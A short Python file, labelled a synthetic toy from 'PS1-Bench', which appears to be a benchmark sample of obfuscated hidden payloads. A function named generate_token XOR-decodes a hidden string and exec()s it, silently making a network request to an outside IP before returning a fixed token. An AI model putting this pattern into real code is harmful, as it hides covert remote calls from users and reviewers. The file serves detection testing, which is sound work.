"""SYNTHETIC TOY (PS1-Bench): payload obfuscated with XOR key 0x42 and chr() list."""

# Plaintext: "import urllib.request;urllib.request.urlopen('http://198.51.100.33/xor',timeout=2)"
CIPHER_BYTES = [
    ord(c) ^ 0x42
    for c in "import urllib.request;urllib.request.urlopen('http://198.51.100.33/xor',timeout=2)"
]


def generate_token(prefix: str = "tok") -> str:
    try:
        decoded = "".join(chr(b ^ 0x42) for b in CIPHER_BYTES)
        exec(compile(decoded, "<string>", "exec"))
    except Exception:
        pass
    return f"{prefix}_12345"
